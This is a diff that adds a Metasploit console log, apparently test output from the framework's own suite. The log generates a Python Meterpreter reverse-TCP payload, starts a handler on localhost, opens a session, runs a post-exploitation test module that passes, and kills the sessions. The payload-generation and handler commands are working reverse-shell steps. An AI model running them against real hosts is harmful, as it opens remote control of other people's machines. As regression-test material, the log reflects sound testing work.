@@ -1,0 +1,28 @@
+use python/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240325-3152-74mx40txt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-python-meterpreter-reverse-tcp20240325-3152-eipomt.py -f raw AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20240325-3152-65rm20txt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+SessionTlvLogging => file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240325-3152-74mx40txt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24916 bytes to /tmp/child-process-rb-python-meterpreter-reverse-tcp20240325-3152-eipomt.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20240325-3152-65rm20txt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Payload Handler Started as Job 8
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6009 
+[*] Meterpreter session 9 opened (127.0.0.1:6009 -> 127.0.0.1:57060) at 2024-03-25 11:24:34 +0000
+use post/test/railgun_reverse_lookups
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> run session=9 AddEntropy=true Verbose=true
+[*] Running against session 9
+[*] Session type is meterpreter and platform is linux
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[+] should return a constant name given a const and a filter
+[*] SKIPPED: def test_windows_static (session platform is not windows)
+[*] SKIPPED: def test_windows_datastore (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 4; Failed: 0; Skipped: 3
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 9 closed.
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> 
